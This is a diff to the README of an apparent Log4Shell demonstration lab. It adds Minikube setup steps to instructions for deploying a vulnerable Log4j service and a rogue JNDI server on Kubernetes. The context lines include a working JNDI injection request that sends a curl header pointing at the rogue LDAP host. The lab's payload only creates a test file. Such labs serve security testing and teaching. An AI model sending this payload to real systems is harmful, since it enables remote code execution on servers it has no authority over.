@@ -30,6 +30,14 @@ cd ..
 The provided `Dockerfile-rogue-jndi` is set to executed on the compromised workload the command:  
 `touch /root/test.txt` 
 
+## Start Minikube
+
+If you want to test this locally, you can use Minikube.
+
+```bash
+minikube start
+```
+
 ## Deploy on Kubernetes
 
 ```bash
@@ -50,6 +58,7 @@ kubectl logs service/vulnerable-log4j -f
 ```bash
 kubectl run my-shell --rm -it --image curlimages/curl -- sh
 curl vulnerable-log4j:8080 -H 'X-Api-Version: ${jndi:ldap://rogue-jndi:1389/o=tomcat}'
+exit
 ```
 
 ## Check that the attack succeded
